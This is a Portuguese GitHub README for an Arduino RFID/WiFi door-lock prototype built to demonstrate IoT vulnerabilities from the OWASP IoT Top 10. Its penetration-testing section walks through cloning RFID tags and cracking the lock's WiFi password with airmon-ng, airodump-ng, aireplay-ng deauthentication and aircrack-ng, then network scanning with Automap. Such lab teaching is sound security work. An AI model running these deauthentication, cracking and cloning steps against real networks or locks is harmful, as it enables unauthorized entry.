# Arduino-DoorLock


O projeto apresentado no presente repositório se trata de um sistema de controle de acesso físico utilizando o microcontrolador Arduino. O protótipo final simula o funcionamento de um mecanismo para trancar e destrancar portas de forma eletrônica, controlado via Cartão RFID e WiFi, onde, caso o acesso seja bem-sucedido, um Servo Motor é movimentado liberando a abertura da porta.

A premissa ao simular - o que poderia ser o controle de acesso físico de um ambiente real - é evidenciar, analisar e explorar as possíveis vulnerabilidades que podem ser encontradas em implementações inseguras de redes e dispositivos IoT. Para tanto, neste projeto, são executados testes de segurança que exemplificam de forma semelhante a realidade os ataques cibernéticos mais recorrentes, conforme aponta o relatório da [“OWASP Top 10 IoT”](https://owasp.org/www-pdf-archive/OWASP-IoT-Top-10-2018-final.pdf), de 2018.


## Tabela de Conteúdos
* [Sobre](#arduino-doorlock)
* [Tabela de Conteúdos](#tabela-de-conteúdos)
* [Pré-Requisitos](#pré-requisitos)
* [User Story](#user-story)
* [Testes de Invasão](#testes-de-invasão)
* [Autores](#autores)

## Pré-Requisitos
Nesta seção são apresentados todos os pré-requisitos necessários para reproduzir o protótipo do [DoorLock](https://github.com/iuribpmoro/Arduino-DoorLock).

### Materiais
Para montagem deste projeto serão necessários os seguintes componentes:
* [Arduino UNO](https://www.filipeflop.com/produto/placa-uno-r3-cabo-usb-para-arduino/)
* [Protoboard 400 pontos](https://www.filipeflop.com/produto/protoboard-400-pontos/#tab-description)
* [Servo Motor](https://www.filipeflop.com/produto/micro-servo-sg92r-9g-towerpro/)
* [Módulo leitor RFID MFRC522](https://www.filipeflop.com/produto/kit-modulo-leitor-rfid-mfrc522-mifare/?utm_source=google&utm_medium=organic&utm_campaign=shopping&utm_content=surfaces_across_google)
* [Ethernet Shield W5100 para Arduino](https://www.filipeflop.com/produto/ethernet-shield-w5100-para-arduino/)
* [Cabo de Rede](https://www.filipeflop.com/produto/cabo-de-rede-conector-rj45-15m/)
* [Sensor Hall Magnético KY-003](https://www.filipeflop.com/produto/sensor-hall-ky-003/)
* [LED Verde](https://www.baudaeletronica.com.br/led-difuso-5mm-verde.html)
* [LED Vermelho](https://www.baudaeletronica.com.br/led-difuso-5mm-vermelho.html)
* [2 x Resistor 220Ω](https://www.filipeflop.com/produto/resistor-220%cf%89-14w-x20-unidades/)
* Jumpers

### Montagem
A montagem deste projeto segue o sketch de demonstração.
Lembrando que o Ethernet Shield deve ser conectado sobre o Arduino.

<details>
  <summary>Clique para visualizar o sketch</summary>
  <img alt="DoorLock Sketch" src="https://github.com/iuribpmoro/Arduino-DoorLock/blob/main/Sketch/door_lock_sketch.png" height="700px">
</details>

### Instalação
Para anexar o protótipo em uma maquete ou mesmo em uma porta, deve-se seguir a estrutura:
[instalacao-doorlock.pdf](https://github.com/iuribpmoro/Arduino-DoorLock/files/6788697/instalacao-doorlock.pdf)

### Softwares
Os pré-requisitos a nível de software para reproduzir a aplicação:
* [Arduino IDE](https://www.arduino.cc/en/software)
* [Biblioteca](https://www.arduino.cc/reference/en/libraries/mfrc522/) (Passo a passo: [Adicionar bibliotecas na IDE do arduino](https://www.robocore.net/tutoriais/adicionando-bibliotecas-na-ide-arduino))
* [Código-fonte do DoorLock](https://github.com/iuribpmoro/Arduino-DoorLock/blob/main/DoorLock/DoorLock.ino)

Por fim, o arduino deve ser conectado via USB com o computador, o código deve ser carregado na placa e o ambiente estará pronto.

## User Story

### Cartão
**Eu como** pessoa autorizada a acessar um determinado local

**Quero que** consiga abrir a porta deste local aproximando meu cartão RFID do leitor<br>
**Ou** consiga abrir a porta deste local através da wifi, acessando uma determinada rota que faz uma requisição de abertura da porta
**e** só tranque novamente quando após eu fechá-la
**ou** caso eu não abra, deverá se trancar novamente

**Para** não utilizar chaves<br>
**e** poder manipular a minha fechadura a distância

### Conversa
O servo deve girar em 90º quando:
- O conteúdo lido no card RFID estiver correspondente
- A requisição WiFi enviada for para a rota /b

O controle para saber se a porta está aberta ou fechada de ser feita pelo Sensor Magnético.<br>
Se estiver perto do imã que está na porta, significa que está fechada. Senão, está aberta.

### Confirmação

Cenário 01 - Abrindo a porta - <Válido>: 
1.  **Dado que** possuo um cartão RFID autorizado ou conheço a requisição WiFi correta a ser enviada
2.  **Quando** aproximar meu cartão da leitora ou enviar uma requisição WiFi correta
3.  **Então** o LED verde acenderá, a fechadura será destrancada e eu poderei abrir a porta dentro dos próximos 5 segundos.
4.  **Caso 1:** Caso eu não abra a porta, a fechadura irá trancar novamente e o LED verde será apagado
5.  **Caso 2:** Caso eu abra a porta, a fechadura só vai trancar 5 segundos após eu fechar, assim como o LED verde se apagará

Cenário 02 - Abrindo a porta - <Inválido>: 
1.  **Dado que** não possuo um cartão RFID autorizado, nem conheço a requisição WiFi correta a ser enviada
2.  **Quando** aproximar meu cartão da leitora ou enviar uma requisição WiFi incorreta ou apenas tentar abrir a porta
3.  **Então** o LED vermelho acenderá e a fechadura permanecerá trancada.

## Testes de Invasão

Primeiramente, demonstra-se o funcionamento de um ataque físico de cópia de conteúdos em tags RFID, por meio da utilização de um
segundo arduino configurado para atingir esse objetivo. Em segundo lugar, exemplifica-se um ataque de força bruta para a quebra
da senha da rede WiFi na qual o dispositivo está conectado, descrevendo os riscos de utilizar senhas fracas e previsíveis.

Por meio da utilização do script [Automap](https://github.com/iuribpmoro/Automap) que realizam o reconhecimento, scanning e enumeração da rede, descobre-se, por fim, como operar a fechadura por meio de requisições web, finalizando o processo de ataque.

### RFID Hacking
O clonador RFID apresentado realiza a cópia do segundo bloco de conteúdo de uma tag para outra. 
Para clonar o conteúdo da tag RFID, siga os passos abaixo:

- Aperte o botão preto do clonador RFID. 
  - O LED amarelo ficará ativo;
- Aproxime o cartão a ser clonado para realizar a leitura do conteúdo;
- Aperte o botão vermelho do clonador RFID;
  - O LED verde ficará ativo;
- Aproxime o seu cartão para realizar a escrita do conteúdo;

### WiFi Hacking
#### Setup da Interface
- Iniciar modo de monitoramento da interface WiFi:
```bash
sudo airmon-ng start wlan0
```
- Verifique as interfaces wireless:
```bash
sudo iwconfig
```
#### Scanning da Rede
- Realize o scan das redes próximas e tome nota do BSSID e Channel da rede alvo:
```bash
sudo airodump-ng wlan0mon
```
- Realize o scan da rede alvo, tomando nota do MAC dos dispositivos conectados e salvando os handshakes a serem capturados:
```bash
sudo airodump-ng -c <CANAL_DA_REDE> --bssid <BSSID_DA_REDE> -w <PREFIXO_DO_ARQUIVO_DE_OUTPUT> wlan0mon
```
#### Deauthentication
- Em outro terminal, enquanto o outro roda o comando anterior, expulse os hosts da rede por meio de um ataque de deauthentication:
```bash
sudo aireplay-ng -0 2 -a <BSSID_DA_REDE> -c <MAC_DO_DISPOSITIVO>
```
#### Brute Force
- Realize um ataque de força bruta nos pacotes capturados para tentar realizar a quebra da senha:
```bash
sudo aircrack-ng <ARQUIVO>.cap -w <WORDLIST>
```
### Scanneando a Rede
#### Instalando o Automap
- Baixe a ferramenta do github:
```bash
git clone https://github.com/iuribpmoro/Automap
```
- Rode o script de instalação:
```bash
./install.sh
```
#### Rodando o Automap
- Rode o scan na rede e em todos os hosts conectados:
```bash
./Automap.sh network <REDE> <WORDLIST_DE_DIRETORIOS> -n <NUMERO_DE_PORTAS>
```

## Autores
### Gabrieli Silva
[![Gmail Badge](https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=gmail&logoColor=white
)](mailto:nets.gss@gmail.com)[![Linkedin Badge](https://img.shields.io/badge/linkedin%20-%230077B5.svg?&style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/gabrieli-silva-435627164/)
### Iuri Moro
[![Gmail Badge](https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=gmail&logoColor=white
)](mailto:iuribpmoro@gmail.com)[![Linkedin Badge](https://img.shields.io/badge/linkedin%20-%230077B5.svg?&style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/iuribpmoro/)
